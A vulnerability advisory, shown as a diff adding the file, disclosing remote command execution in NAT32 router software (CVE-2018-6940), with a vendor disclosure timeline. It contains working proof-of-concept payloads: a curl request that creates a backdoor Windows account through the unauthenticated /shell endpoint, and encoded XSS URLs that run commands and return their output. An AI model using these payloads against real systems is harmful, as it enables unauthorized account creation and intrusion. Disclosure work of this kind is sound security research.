@@ -1,0 +1,141 @@
+[+] Credits: hyp3rlinx	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/NAT32-REMOTE-COMMAND-EXECUTION-CVE-2018-6940.txt
+[+] ISR: Apparition Security
+
+[-_-] D1rty0tis
+ 
+
+Vendor:
+=============
+www.nat32.com
+
+
+Product:
+=================
+NAT32 Build (22284)
+
+
+NAT32 is a versatile IP Router implemented as a WIN32 application.
+
+
+Vulnerability Type:
+===================
+Remote Command Execution 
+
+
+CVE Reference:
+==============
+CVE-2018-6940
+
+
+Security Issue:
+================
+NAT32 listens on Port 8080 for its Web interface.
+
+C:\>netstat -ano | findstr 8080
+  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       3720
+
+
+If the 'Password Checking' (BASIC authentication) feature is NOT enabled (user must select it under config tab) then remote attackers who can reach
+NAT32 can potentially execute arbitrary commands, if authentication is enabled they will get 'Unauthorized' server reply, however, read on ...
+
+e.g.
+
+Add user account.
+
+C:\>curl "http://x.x.x.x:8080/shell?cmd=run+net+user+D1rty0Tis+abc123+/add"
+<!DOCTYPE html>
+<html>
+<body><pre>run start net user D1rty0Tis abc123 /add Done
+</pre></body></html>
+
+
+If NAT32 'Password Checking' feature IS enabled, remote attackers can STILL potentially issue arbitrary commands exploiting a
+Cross Site Scripting vulnerability in the HTTPD code of NAT32, if authenticated NAT32 users click a malicious link
+or visit an attacker controlled webpage. 
+
+Also worth mentioning, NAT32 implements BASIC authentication which pass BASE64 Encoded credentials which can be easily
+revealed if sniffed on network.
+
+When 'Password Checking' is enabled attackers using Ajax calls via XSS would need to use a combination of '%0D%0A' and double encoding
+to deal with 'white-space' in order for the payload to stay intact.
+
+%25 for '%' sign then 20 (%2520) = %20, using %20 or %2B will not cut it, however '%0D%0A' (CRLF) and '%2520' encoding serves us well.
+
+NAT32 has an interesting Command 'EXECR' that can allow attackers to capture Command output response from the server to see right away if an
+attack was success or not.
+
+e.g.
+
+Add account and get response (EXECR)
+
+HTTP Response:
+<!DOCTYPE html>
+<html>
+<body><pre>The command completed successfully.
+
+execr net user D1rty0Tis abc123 /add Done
+</pre></body></html>
+
+
+The NAT32 'winroute' Command will return host route information.
+
+XSS response
+
+e.g.
+
+<!DOCTYPE html>
+<html>
+<body><pre>Destination    Mask              Nexthop      Metric IfIndex Type Proto Age
+0.0.0.0         0.0.0.0         192.168.1.2        10       b    4     3 21:41 [min:sec]
+127.0.0.0       255.0.0.0       127.0.0.1          306      1    3     3 22:04 [min:sec]
+127.0.0.1       255.255.255.255 127.0.0.1          306      1    3     3 22:04 [min:sec]
+127.255.255.255 255.255.255.255 127.0.0.1          306      1    3     3 22:04 [min:sec]
+</pre></body></html>
+
+
+Exploit/POC:
+=============
+NET32 Password Checking not enabled...
+
+C:\>curl "http://x.x.x.x:8080/shell?cmd=run+net+user+D1rty0Tis+abc123+/add"
+
+
+NAT32 BASIC authentication enabled use XSS...
+
+Add backdoor account and capture CMD output using NAT32 'execr' shell command.
+http://x.x.x.x:8080/shell?cmd=<script>var%0D%0Axhr=new%0D%0AXMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.status==200){alert(xhr.responseText);}};xhr.open('GET','http://x.x.x.x:8080/shell?cmd=execr%2520net%2520user%2520D1rty0Tis%2520abc123%2520/add',true);xhr.send(null);</script>
+
+Get Windows Routes (info disclosure):
+http://x.x.x.x:8080/shell?cmd=%3Cscript%3Evar%0D%0Axhr=new%0D%0AXMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.status==200){alert(xhr.responseText);}};xhr.open(%27GET%27,%27http://x.x.x.x:8080/shell?cmd=winroute%27,true);xhr.send(null);%3C/script%3E
+
+
+
+Network Access:
+===============
+Remote
+
+
+Severity:
+=========
+High
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification: February 9, 2018
+Vendor acknowledgement: February 9, 2018
+Vendor "I've decided to remove the HTTPD code from Build 22284 of NAT32" : February 12, 2018
+www.nat32.com website reads "NAT32 Version 2.2 Build 22284 is temporarily unavailable." : February 13, 2018
+February 14, 2018 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
